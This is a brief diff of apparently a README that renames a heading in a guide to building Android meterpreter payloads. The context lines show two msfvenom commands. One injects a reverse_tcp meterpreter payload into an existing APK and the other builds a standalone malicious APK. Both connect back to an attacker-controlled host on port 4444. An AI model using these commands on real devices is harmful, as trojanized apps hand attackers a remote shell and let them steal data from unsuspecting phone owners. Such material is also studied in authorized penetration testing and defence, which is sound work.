@@ -53,7 +53,7 @@ Use:
 ./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
-## To Create Default Metasploit Vulnerable apk
+## Create Meterpreter APK File
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
